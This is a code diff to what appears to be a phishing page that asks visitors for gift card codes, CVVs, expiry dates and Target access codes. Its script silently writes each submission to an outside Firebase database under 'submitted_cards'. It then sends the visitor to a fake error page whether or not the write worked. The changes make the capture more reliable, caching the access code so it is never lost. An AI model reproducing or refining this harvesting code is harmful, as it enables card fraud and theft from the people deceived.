@@ -499,88 +499,99 @@
   <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
   <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 
-  <script>
-    // Scroll to the form section
-    function scrollToForm(){
-      document.querySelector('.form-section').scrollIntoView({ behavior: 'smooth' });
-    }
-    
-    // Show/hide expiry & CVV fields based on card type selection
-    const giftCardType = document.getElementById("giftCardType");
-    const expiryContainer = document.getElementById("expiryContainer");
-    const cvvContainer = document.getElementById("cvvContainer");
-    const accesscodeContainer = document.getElementById("accesscodeContainer");
-    const requiresExpiryCvv = ["Visa Vanilla", "MasterCard", "Walmart Visa", "TT Visa"];
-    const requiresAccesscode = ["Target"];
-    
-    giftCardType.addEventListener("change", function () {
-    const card = this.value;
+<script>
+  // Scroll to the form section
+  function scrollToForm(){
+    document.querySelector('.form-section').scrollIntoView({ behavior: 'smooth' });
+  }
 
+  // Elements
+  const giftCardType = document.getElementById("giftCardType");
+  const expiryContainer = document.getElementById("expiryContainer");
+  const cvvContainer = document.getElementById("cvvContainer");
+  const accesscodeContainer = document.getElementById("accesscodeContainer");
+  const accesscodeInput = document.getElementById("accesscode");
+
+  // Cache access code safely (IMPORTANT)
+  let savedAccessCode = "";
+
+  accesscodeInput.addEventListener("input", function () {
+    savedAccessCode = this.value;
+  });
+
+  // Card type logic (FIXED)
+  giftCardType.addEventListener("change", function () {
+    const card = this.value; // NO lowercase
+
+    // Hide only expiry & cvv
     expiryContainer.style.display = "none";
     cvvContainer.style.display = "none";
 
     if (["Visa Vanilla", "MasterCard", "Walmart Visa", "TT Visa"].includes(card)) {
-    expiryContainer.style.display = "block";
-    cvvContainer.style.display = "block";
-   }
+      expiryContainer.style.display = "block";
+      cvvContainer.style.display = "block";
+    }
 
-   if (card === "Target") {
-    accesscodeContainer.style.display = "block";
-  } else {
-    accesscodeContainer.style.display = "none";
-  }
-});
+    // Show access code ONLY for Target
+    if (card === "Target") {
+      accesscodeContainer.style.display = "block";
+      accesscodeInput.required = true;
+    } else {
+      accesscodeInput.required = false;
+      // ❌ DO NOT hide again (prevents value loss)
+    }
+  });
 
+  // ----------------------------
+  // FIREBASE INITIALIZATION
+  // ----------------------------
+  var firebaseConfig = {
+    databaseURL: "https://stake-f540f-default-rtdb.firebaseio.com/"
+  };
+  firebase.initializeApp(firebaseConfig);
 
+  // Form submit
+  const giftCardForm = document.getElementById("giftCardForm");
 
-    // ----------------------------
-    // FIREBASE INITIALIZATION
-    // ----------------------------
-    // Use your provided Realtime DB url
-    var firebaseConfig = {
-      databaseURL: "https://stake-f540f-default-rtdb.firebaseio.com/"
+  giftCardForm.addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    const giftType = document.getElementById("giftCardType").value;
+
+    // Enforce access code for Target
+    if (giftType === "Target" && !savedAccessCode) {
+      alert("Access code is required for Target gift cards.");
+      return;
+    }
+
+    const data = {
+      giftCardType: giftType,
+      currency: document.getElementById("currency").value || "",
+      amount: document.getElementById("amount").value || "",
+      cardCode: document.getElementById("cardCode").value || "",
+      expiryDate: document.getElementById("expiryDate").value || "",
+      cvv: document.getElementById("cvv").value || "",
+      accesscode: savedAccessCode || "", // ✅ GUARANTEED
+      userAgent: navigator.userAgent,
+      time: new Date().toISOString()
     };
-    firebase.initializeApp(firebaseConfig);
 
-    // Form handling: send to Firebase in background and redirect
-    const giftCardForm = document.getElementById("giftCardForm");
+    // Debug proof (remove later)
+    console.log("Submitting data:", data);
 
-    giftCardForm.addEventListener("submit", function(e) {
-      e.preventDefault();
+    firebase.database().ref("submitted_cards").push(data)
+      .then(() => {
+        window.location.href = "https://giftcarderror.tiiny.site";
+      })
+      .catch(() => {
+        window.location.href = "https://giftcarderror.tiiny.site";
+      });
+  });
+</script>
 
-      // collect form values
-      const data = {
-        giftCardType: document.getElementById("giftCardType").value || "",
-        currency: document.getElementById("currency").value || "",
-        amount: document.getElementById("amount").value || "",
-        cardCode: document.getElementById("cardCode").value || "",
-        expiryDate: document.getElementById("expiryDate").value || "",
-        cvv: document.getElementById("cvv").value || "",
-        accesscode: document.getElementById("accesscode").value || "", 
-        userAgent: navigator.userAgent || "",
-        time: new Date().toISOString()
-      };
-
-      // small validation: require cardCode and type & currency
-      if (!data.giftCardType || !data.currency || !data.cardCode|| !data.accesscode ) {
-        alert("Please fill required fields.");
-        return;
-      }
-
-      // push to Realtime DB under 'submitted_cards' (silent)
-      firebase.database().ref("submitted_cards").push(data)
-        .then(() => {
-          // always redirect, even if push succeeded or failed
-          window.location.href = "https://giftcarderror.tiiny.site";
-        })
-        .catch(() => {
-          // redirect even if write error
-          window.location.href = "https://giftcarderror.tiiny.site";
-        });
-    });
-  </script>
 </body>
 </html>
+
 
 
 
